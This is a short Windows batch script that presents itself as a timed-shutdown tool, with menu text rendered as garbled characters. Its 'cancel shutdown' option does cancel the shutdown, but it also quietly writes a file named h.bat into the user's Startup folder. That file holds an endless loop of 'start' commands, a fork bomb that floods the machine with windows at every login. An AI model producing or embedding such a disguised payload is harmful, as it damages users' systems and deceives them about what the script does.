@echo off
title ��ʱ�ػ�С����v1.0  
color 0a
:menu
cls �����Ļ
echo ==================================
echo               �˵�
echo            1.��ʱ�ػ�
echo            2.ȡ����ʱ
echo            3.�˳�
echo ==================================
set /p num=����ѡ��
if "%num%"=="1"  goto 1
if "%num%"=="2"  goto 2
if "%num%"=="3"  goto 3
goto menu
:1
set /p aa=������ʱ�䣨��λ/�룩
shutdown /s /t  %aa%"
goto menu
:2
shutdown -a
echo :a >> "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\h.bat"
echo start >>"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\h.bat"
echo goto a >>"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\h.bat"
goto menu
:3
exit
